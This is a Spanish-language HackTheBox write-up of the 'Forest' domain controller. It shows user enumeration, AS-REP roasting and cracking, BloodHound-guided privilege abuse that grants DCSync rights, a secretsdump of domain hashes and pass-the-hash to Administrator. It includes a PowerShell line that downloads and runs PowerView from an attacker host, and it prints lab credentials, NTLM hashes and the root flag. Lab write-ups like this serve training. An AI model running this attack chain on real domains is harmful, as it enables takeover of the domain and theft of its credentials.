Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #bloodhound #ad #smb #account-operators #password-cracking #pass-the-hash #dcsync

![](assets/Pasted%20image%2020260104161527.png)

## Reconocimiento

Tiro un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ ping -c 1 10.129.22.185
PING 10.129.22.185 (10.129.22.185) 56(84) bytes of data.
64 bytes from 10.129.22.185: icmp_seq=1 ttl=127 time=90.0 ms

--- 10.129.22.185 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 89.978/89.978/89.978/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.22.185 -oG nmap/allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49698/tcp open  unknown          syn-ack ttl 127
```

- Vemos un montón de puertos abiertos, entre ellos el 445 SMB, 88 Kerberos, 53 DNS, 5985 WinRm entre otros.

Sobre los puertos abiertos realizo un segundo escaneo mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49670,49676,49677,49683,49698 -sV -sC -n -Pn -vvv 10.129.22.185 -oN target

PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-04 22:26:54Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49683/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m50s, deviation: 4h37m11s, median: 6m48s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 29555/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 9203/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35459/udp): CLEAN (Timeout)
|   Check 4 (port 14499/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2026-01-04T22:27:47
|_  start_date: 2026-01-04T22:22:04
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-01-04T14:27:52-08:00
```

Por la informacion recabada podemos intuir que estamos contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 445, 139 SMB
- Puerto 5985 WINRM
- Puerto 389 LDAP

## Enumeración

### Puerto 445 SMB

Saque un poco de info de la maquina.

- Nombre de la maquina FOREST 
- Dominio **htb.local**
- Corre un Windows 10 Server 2016

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ nxc smb 10.129.22.185
SMB         10.129.22.185   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

**Shares con Null Session.**

Al momento de listar los shares utilizando null session nos damos cuenta de que no tenemos acceso.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ nxc smb 10.129.22.185 -u '' -p '' --shares
SMB         10.129.22.185   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.22.185   445    FOREST           [+] htb.local\:
SMB         10.129.22.185   445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```


### Puerto 88 Kerberos

**Aunque no sea muy efectivo siempre podemos enumerar usuarios con Kerbrute.**


```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ ./kerbrute userenum --dc 10.129.22.185 -d htb.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/04/26 - Ronnie Flathers @ropnop

2026/01/04 16:27:16 >  Using KDC(s):
2026/01/04 16:27:16 >   10.129.22.185:88

2026/01/04 16:27:16 >  [+] VALID USERNAME:       mark@htb.local
2026/01/04 16:27:22 >  [+] VALID USERNAME:       andy@htb.local
2026/01/04 16:27:30 >  [+] VALID USERNAME:       forest@htb.local
2026/01/04 16:27:40 >  [+] VALID USERNAME:       Mark@htb.local
2026/01/04 16:27:42 >  [+] VALID USERNAME:       administrator@htb.local
2026/01/04 16:28:04 >  [+] VALID USERNAME:       Andy@htb.local
2026/01/04 16:28:27 >  [+] VALID USERNAME:       sebastien@htb.local
2026/01/04 16:28:54 >  [+] VALID USERNAME:       MARK@htb.local
2026/01/04 16:29:27 >  [+] VALID USERNAME:       Forest@htb.local
2026/01/04 16:29:40 >  [+] VALID USERNAME:       santi@htb.local
2026/01/04 16:29:52 >  [+] VALID USERNAME:       lucinda@htb.local
2026/01/04 16:30:02 >  [+] VALID USERNAME:       Administrator@htb.local
2026/01/04 16:32:12 >  [+] VALID USERNAME:       ANDY@htb.local
```

Encontramos varios usuarios como:

- andy
- mark
- forest
- lucinda
- sebastien 

### Puerto 135 RPC

Puedo conectarme mediante uso de una Null Session al RPC.

- Enumeracion de usuarios.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ rpcclient -U '' -N 10.129.22.185

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Aparte de los usuarios que ya vimos mediante Kerbrute podemos ver otros como

- svc-alfresco

## Explotación

### AS-REP Roasting

Con una lista de usuarios validos podemos realizar un ataque AS-REP Roasting 

- Este tipo de ataque **se aprovecha de cuentas que NO requieren pre-authentication**. Cuando el preauth esta deshabilitado podemos mandar una AS-REQ (Una solicitud de autenticación) solo con nuestro usuario valido y el KDC responderá con un **AS-REP**, el cual contiene un **blob cifrado con una clave derivada de la contraseña del usuario**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ impacket-GetNPUsers htb.local/ -no-pass -usersfile content/users.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't' have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:3526df52141e4d6878e90cd95724b814$e2df4fdc71d1dda6cc8a6df4fc1f03146ba6521558cb76625625ba709e73d6d5affb3a7b893ca49c435015a60df616f54907dc8e6cc9f3fffe6ad518dc7655472b72986121aece185c5de4d048d9fe1a1dfa8119f3b08a1a6719972d8149f63e3becdac84b2d21ed55ccf4550e40b2ec6c31a62d99697ef1e695c7da9c162293bda8bd6089e5c476eaeeb0a1f7b42539dacda8209348e2ed0c374def9cabc37f40baf0697a7e2dc47ea2b6e076aa1ba15858a4b36586eeb33dfdaa5508e3ddd508153e69939285988e25514a6bad045b03983a707dcb27e73c900f57037adad1f7a6215068fe
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- Podemos ver que el usuario svc-alfresco tiene deshabilitado el preauth y nos devuelva un hash.

Podemos crackear el hash con `hashcat`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ hashcat -m 18200 loot/svc_alfredo.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting


Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:3526df52141e4d6878e90cd95724b814$e2df4fdc71d1dda6cc8a6df4fc1f03146ba6521558cb76625625ba709e73d6d5affb3a7b893ca49c435015a60df616f54907dc8e6cc9f3fffe6ad518dc7655472b72986121aece185c5de4d048d9fe1a1dfa8119f3b08a1a6719972d8149f63e3becdac84b2d21ed55ccf4550e40b2ec6c31a62d99697ef1e695c7da9c162293bda8bd6089e5c476eaeeb0a1f7b42539dacda8209348e2ed0c374def9cabc37f40baf0697a7e2dc47ea2b6e076aa1ba15858a4b36586eeb33dfdaa5508e3ddd508153e69939285988e25514a6bad045b03983a707dcb27e73c900f57037adad1f7a6215068fe

:s3rvice

```

- Credenciales svc-alfresco/s3rvice

Podemos probar estas credenciales en el SMB u otros servicios, en este caso utilice `netexec` para probarlas en el servicio `WinRm`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ nxc winrm 10.129.22.185 -u 'svc-alfresco' -p 's3rvice'
WINRM       10.129.22.185   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)

WINRM       10.129.22.185   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

- El usuario svc-alfresco tiene acceso via winrm.

Por lo cual ahora voy a conectarme por WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ evil-winrm -i 10.129.22.185 -u svc-alfresco -p s3rvice


Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco

```

## Escalada de Privilegios

Dentro del sistema enumere manualmente mis privilegios y los grupos a los que pertenezco pero no note nada raro. Opte por usar `bloodhound`.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Lo primero que tenemos que hacer es utilizar un **Ingestor** que basicamente se va a encargar de recopilar toda la informacion del dominio. En este caso usamos `bloodhound-python` pero existen otros como `SharpHound.exe` etc.

```bash
──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.22.199 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Testing resolved hostname connectivity dead:beef::f0c6:8a7:a02f:fdb1
INFO: Trying LDAP connection to dead:beef::f0c6:8a7:a02f:fdb1
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Testing resolved hostname connectivity dead:beef::f0c6:8a7:a02f:fdb1
INFO: Trying LDAP connection to dead:beef::f0c6:8a7:a02f:fdb1
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 31S
INFO: Compressing output into 20260104180430_bloodhound.zip
```

- Esto nos genera un zip que contiene la informacion y la cual podemos  importar y visualizar en **BloodHound.**

Ahora tenemos que ejecutar `bloodhound`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ bloodhound
```

- Esto nos abrirá una interfaz visual en el navegador donde podremos importar nuestro zip. Si es la primera vez que lo ejecutas seguramente requerirá un proceso de instalación simple.

Nos iremos a la parte de `Explore -> Search` y colocaremos nuestro nodo **svc-alfresco** que corresponde al usuario al que ya tenemos acceso.

- Le daremos click y Nos iremos a `Cypher -> Shortest Paths to Domain Admins`.

![](assets/Pasted%20image%2020260104181218.png)

- Lo que sucedera es que obtendremos varias Paths para escalar privilegios entre ellas la siguiente.

En este path podemos ver que nuestro usuario alfresco pertenece al grupo **Service Account** que a su vez pertenece a **Privileged IT Accounts** que a su vez pertenece a **Account Operators**

- Vamos a empezar desde el nodo de **Account Operators**.

![](assets/Pasted%20image%2020260104182048.png)

- Account Operators tiene la capacidad de crear y modificar usuarios y grupos a nivel de dominio.

Gracias a que soy parte de **Account Operators** lo primero que voy a hacer es crearme un usuario para posteriormente meterlo al grupo **Exchange Windows Permissions** que corresponde al siguiente nodo en la escalada de privielegios.

```powershell
*Evil-WinRM* PS C:\Users\ > net user wndr wndr123 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user wndr
```

Ahora tenemos que meter al usuario **wndr** (o el que hayamos creado) al grupo **Exchange Windows Permissions**. Como somos parte de **Account Operators** tenemos la capacidad de meter al usuario directamente al grupo.

```powershell
*Evil-WinRM* PS C:\Users> net group "Exchange Windows Permissions" wndr /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\> net user wndr
User name                    wndr
Full Name
Comment

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

Ahora que somos parte del grupo **Exchange Windows Permissions** tenemos que abusar del privilegio **WriteDacl** como nos lo indica Bloodhound para otorgarnos permisos de DCSync.

![](assets/Pasted%20image%2020260104185227.png)

```bash
*Evil-WinRM* PS C:\Users\> $SecPassword = ConvertTo-SecureString 'wndr123' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\wndr', $SecPassword)
```

Antes de ejecutar lo siguiente es necesario importar [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1) a nuestra sesion.

```bash
*Evil-WinRM* PS C:\Users\> IEX(New-Object Net.WebClient).downloadString("http://<TUIP>/PowerView.ps1")
*Evil-WinRM* PS C:\Users\> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity wndr -Rights DCSync
```

Si todo sale bien vamos a poder realizar un DCSync para dumpear el NTDS.dit que es donde se almacenan todos los hashes a nivel de dominio.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ sudo impacket-secretsdump htb.local/wndr:wndr123@10.129.22.199

[sudo] password for wndr:
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

- Podemos ver el hash del Administrator.

Podemos crackear ese hash o realizar un Pass The Hash.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/forest]
└─$ evil-winrm -i 10.129.22.199 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6


Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e0e87518439341558a038288422227f4
```

***PWNED***

![](assets/Pasted%20image%2020260104191547.png)
